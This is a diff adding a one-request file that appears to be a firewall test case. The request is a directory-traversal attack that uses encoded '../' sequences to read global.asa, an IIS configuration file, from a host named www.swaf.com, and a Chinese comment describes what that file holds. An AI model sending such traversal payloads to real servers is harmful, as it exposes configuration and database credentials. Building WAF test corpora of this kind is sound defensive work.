@@ -1,0 +1,9 @@
+# 目录遍历_global.asa
+# global.asa 文件通常包含应用程序级别的配置信息和事件处理程序，例如应用程序的初始化和终止事件、会话开始和结束事件等。这些事件可以用于执行特定的操作，如设置应用程序范围的变量、连接到数据库等。
+GET /?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fc:%2Finetpub%2Fwwwroot%2Fglobal.asa&bid=hd_tag_m8mv25c0 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25c0
+RM-PRO-Token: 1932e7df651fe8a25c656bb55a82b2d1
+RM-PRO-Time: 1742808459008
+User-Agent: curl/7.83.1
+
